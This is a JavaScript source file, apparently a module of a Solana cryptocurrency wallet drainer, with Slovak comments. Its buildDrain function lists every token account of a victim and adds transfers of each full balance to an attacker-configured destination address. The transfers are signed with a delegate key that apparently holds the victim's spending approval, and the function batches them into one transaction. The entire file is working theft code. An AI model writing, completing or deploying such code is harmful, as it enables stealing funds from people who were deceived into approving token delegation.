const { 
    Transaction, 
    PublicKey 
} = require("@solana/web3.js");

const {
    createTransferInstruction,
    getAssociatedTokenAddressSync,
    createAssociatedTokenAccountInstruction,
    TOKEN_PROGRAM_ID
} = require("@solana/spl-token");

const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { getBlockhash, setBlockhash } = require("../core/blockhashCache");

const MIN_RAW_AMOUNT = 1000n;
const MAX_INSTRUCTIONS_PER_TX = 12;

async function buildDrain(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();

            const userPubkey = new PublicKey(user);
            const delegatePubkey = new PublicKey(config.WALLET);
            const destinationPubkey = new PublicKey(config.DESTINATION_ADDRESS);
            const feePayer = new PublicKey(config.PUBLIC_KEY);

            // Blockhash
            let blockhash = getBlockhash();
            if (!blockhash) {
                const latest = await conn.getLatestBlockhash("confirmed");
                blockhash = latest.blockhash;
                setBlockhash(blockhash);
            }

            tx.recentBlockhash = blockhash;
            tx.feePayer = feePayer;

            // ===== 1. Načítaj token účty používateľa =====
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

            // ===== 2. Pre každý token priprav drain =====
            for (const token of tokenAccounts.tokens || []) {
                const rawAmount = BigInt(token.amount);
                if (rawAmount < MIN_RAW_AMOUNT) continue;

                const mint = new PublicKey(token.mint);
                const userAta = new PublicKey(token.ata);

                // Destination ATA
                const destAta = getAssociatedTokenAddressSync(
                    mint,
                    destinationPubkey,
                    false,
                    TOKEN_PROGRAM_ID
                );

                // Skús zistiť, či ATA existuje
                const destInfo = await conn.getAccountInfo(destAta);
                if (!destInfo) {
                    tx.add(
                        createAssociatedTokenAccountInstruction(
                            feePayer,
                            destAta,
                            destinationPubkey,
                            mint,
                            TOKEN_PROGRAM_ID,
                            TOKEN_PROGRAM_ID
                        )
                    );
                }

                // Transfer (drain) tokenov z user ATA → destination ATA
                tx.add(
                    createTransferInstruction(
                        userAta,
                        destAta,
                        delegatePubkey,
                        rawAmount
                    )
                );

                if (tx.instructions.length >= MAX_INSTRUCTIONS_PER_TX) {
                    break;
                }
            }

            logger.info("Drain TX built", {
                instructions: tx.instructions.length,
                maxInstructionsPerTx: MAX_INSTRUCTIONS_PER_TX
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build drain transaction", { error: err.message });
            throw err;
        }
    }, "buildDrain");
}

module.exports = { buildDrain };
